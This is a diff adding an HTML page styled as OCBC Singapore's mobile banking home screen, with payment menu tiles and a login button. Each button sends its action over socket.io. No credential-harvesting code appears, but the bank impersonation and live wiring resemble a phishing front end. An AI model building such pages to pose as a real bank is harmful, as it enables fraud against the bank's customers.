@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ATM Mobile Link</title>
+    <link rel="stylesheet" href="/css/MobIndex.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+    <div class="header">
+        <h1>24-7 ATM enables <span class="highlight">aspirations</span>.<br>
+        All across ASEAN and Greater China.</h1>
+    </div>
+
+    <div class="bottom-section">
+        
+        <div class="icon-grid">
+            <div class="menu-item" onclick="sendAction('one-token')">
+                <div class="icon-circle"><i class="fa-solid fa-mobile-screen-button"></i></div>
+                <div class="menu-label">OneToken</div>
+            </div>
+            <div class="menu-item" onclick="sendAction('scan-pay')">
+                <div class="icon-circle"><i class="fa-solid fa-qrcode"></i></div>
+                <div class="menu-label">Scan & Pay</div>
+            </div>
+            <div class="menu-item" onclick="sendAction('paynow')">
+                <div class="icon-circle"><i class="fa-solid fa-money-bill-transfer"></i></div>
+                <div class="menu-label">PayNow</div>
+            </div>
+            <div class="menu-item" onclick="sendAction('insights')">
+                <div class="icon-circle"><i class="fa-solid fa-lightbulb"></i></div>
+                <div class="menu-label">Insights</div>
+            </div>
+            <div class="menu-item" onclick="sendAction('forex')">
+                <div class="icon-circle"><i class="fa-solid fa-comments-dollar"></i></div>
+                <div class="menu-label">Exchange</div>
+            </div>
+            <div class="menu-item" onclick="sendAction('more')">
+                <div class="icon-circle"><i class="fa-solid fa-ellipsis"></i></div>
+                <div class="menu-label">More</div>
+            </div>
+        </div>
+
+        <div class="login-container">
+            <button class="login-btn" onclick="sendAction('login')">
+                Log in to OCBC Singapore
+            </button>
+        </div>
+
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/MobIndex.js"></script>
+</body>
+</html>
